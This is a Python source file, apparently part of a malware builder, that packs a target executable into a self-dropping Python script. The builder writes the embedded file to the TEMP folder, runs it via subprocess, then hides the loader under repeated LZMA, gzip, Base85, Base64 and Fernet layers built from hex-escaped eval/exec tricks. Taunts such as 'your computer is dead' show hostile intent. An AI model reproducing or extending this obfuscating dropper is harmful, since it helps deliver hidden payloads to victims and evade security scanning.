import cryptography.fernet
import builtins
import base64
import lzma
import gzip
import os

from ..Generator import Generator

def hexlify(text: str | bytes, *, octal: bool = True) -> str:
    output = ""

    if isinstance(text, str):
        text = text.encode(errors="surrogatepass")

    for code in text:
        if code <= 777 and octal:
            output += "\\" + oct(code)[2:]
        elif code <= 255:
            output += "\\x" + hex(code)[2:].zfill(2)
        else:
            output += "\\u" + hex(code)[2:].zfill(4)

    return output

def index(pkg: object, key: str) -> int:
    return [*pkg.__dict__].index(key)

def backslash(data: bytes) -> bytes:
    new = b""

    for code in data:
        ch = bytes([code])
        if code > 126 or code < 32:
            new += hexlify(ch, octal=False).encode()
        else:
            new += ch

    return new

PAYLOAD1 = r"""
eval(compile((___:=__import__)('{1}').fernet.Fernet(br'''%s''').decrypt(b''.fromhex(r'''%s''')),"{4}"%%(___('{0}').urandom({2})),'{3}'))
""".strip().format(
    hexlify('os'),
    hexlify('cryptography.fernet'),
    oct(512),
    hexlify('exec'),
    hexlify('%r\x08❤')
).encode(errors='surrogatepass')

PAYLOAD2 = r"""
[*(________________________:=___)('{2}').__dict__.values()][{3}](getattr(________________________('{0}'),'{1}')(r'''%b'''.encode(errors='{4}')))
""".strip().format(
    hexlify('base64'),
    hexlify('a85decode'),
    hexlify('builtins'),
    index(builtins, 'exec'),
    hexlify('surrogatepass')
).encode(errors="surrogatepass")

PAYLOAD2_1 = r"""
[*___('{2}').__dict__.values()][{3}](getattr(___('{0}'),'{1}')(r'''%b'''.encode(errors='{4}')))
""".strip().format(
    hexlify('base64'),
    hexlify('b64decode'),
    hexlify('builtins'),
    index(builtins, 'exec'),
    hexlify('surrogatepass')
).encode(errors="surrogatepass")

PAYLOAD2_2 = r"""
[*__import__('{2}').__dict__.values()][{3}]((___:=getattr)((_____:=__import__)('{0}'),'{1}')((____:=r'''%b''').encode(errors='{4}')))
""".strip().format(
    hexlify('base64'),
    hexlify('b85decode'),
    hexlify('builtins'),
    index(builtins, 'exec'),
    hexlify('surrogatepass')
).encode(errors="surrogatepass")

PAYLOAD3 = r"""
eval(compile((_______:=__build_class__(lambda:None,"\r"+bytes(()).decode(errors="{5}",encoding="{6}")*{0},bytearray))()+___(_____('{3}'),'{4}')(___(_______,'{7}')('%b')),'{1}','{2}'))
""".strip().format(
    oct(219),
    hexlify('olafcio owns you'),
    hexlify('exec'),
    hexlify('gzip'),
    hexlify('decompress'),
    hexlify('namereplace'),
    hexlify('utf-16-le'),
    hexlify('fromhex')
).encode(errors="surrogatepass")

PAYLOAD4 = r"""
(__________________:=eval)(compile((_______:=__build_class__(lambda:None,"\r"+bytes(()).decode(errors="{5}",encoding="{6}")*{0},bytearray))()+___(_____('{3}'),'{4}')(___(_______,'{7}')('%b')),'{1}','{2}'))
""".strip().format(
    oct(219),
    hexlify('your computer is dead'),
    hexlify('exec'),
    hexlify('lzma'),
    hexlify('decompress'),
    hexlify('xmlcharrefreplace'),
    hexlify('utf-7'),
    hexlify('fromhex')
).encode(errors="surrogatepass")

PAYLOAD5 = r"""
__=open(_:=(___(_____('{0}'),'{1}')('{2}')+'{3}%s'),'wb');___(__,'{4}')(___(_______,'{5}')('''%b'''));___(__,'{6}')();___(_____('{7}'),'{8}')(___('%s','{10}')('{9}',_,1),__________________(___(_____('{13}'),'{14}')(b'{12}')),None,None,None,None,None,not~-1,not~-1);
""".strip().format(
    hexlify('os'),
    hexlify('getenv'),
    hexlify('TEMP'),
    hexlify('/'),
    hexlify('write'),
    hexlify('fromhex'),
    hexlify('close'),
    hexlify('subprocess'),
    hexlify('run'),
    hexlify(r'%s'),
    hexlify('replace'),
    hexlify('surrogatepass'), # Unused
    hexlify(base64.b32hexencode(b'~0')),
    hexlify('base64'),
    hexlify('b32hexdecode')
).encode(errors="surrogatepass")

class PythonGenerator(Generator):
    def _run(self) -> str:
        self.print("🐍 Starting Python generation")

        script = self._input

        script = PAYLOAD5 % (
            hexlify(self._filename).replace("'", "\\'").encode(),
            script.hex().encode(),
            hexlify(self._command).replace("'", "\\'").encode()
        )
        self.print("🎯 Target code has been added")

        for i in range(1):
            script = PAYLOAD4 % lzma.compress(b'exec(bytes((%s,)))' % b",".join(b"%d" % ch for ch in script), preset=9).hex().encode()
            self.print("🧪 LZMA payload #%d prepared" % (i + 1), back=True)

        self.print()

        for i in range(1):
            script = PAYLOAD3 % gzip.compress(b'exec(bytes((%s,)))' % b",".join(b"%d" % ch for ch in script), compresslevel=9).hex().encode()
            self.print("🤐 GZIP payload #%d prepared" % (i + 1), back=True)

        self.print()

        for i in range(3):
            script = PAYLOAD2_2 % base64.b85encode(script).replace(b"'''", b"''\\'")

            self.print("📨 Base85 payload #%d prepared" % (i + 1), back=True)

        self.print()

        for i in range(9):
            script = PAYLOAD2_1 % base64.b64encode(script).replace(b"'''", b"''\\'")

            self.print("📨 Base64 payload #%d prepared" % (i + 1), back=True)

        self.print()

        # for i in range(1):
        #     script = PAYLOAD2 % base64.a85encode(script).replace(b"'''", b"''\\'")

        #     self.print("📨 Ascii85 payload #%d prepared" % (i + 1), back=True)

        # self.print()

        for i in range(6):
            key = base64.urlsafe_b64encode(os.urandom(32))
            content = cryptography.fernet.Fernet(key).encrypt(script).hex().upper().encode()

            script = PAYLOAD1 % (key, content)

            self.print("🔑 Fernet payload #%d prepared" % (i + 1), back=True)

        return script
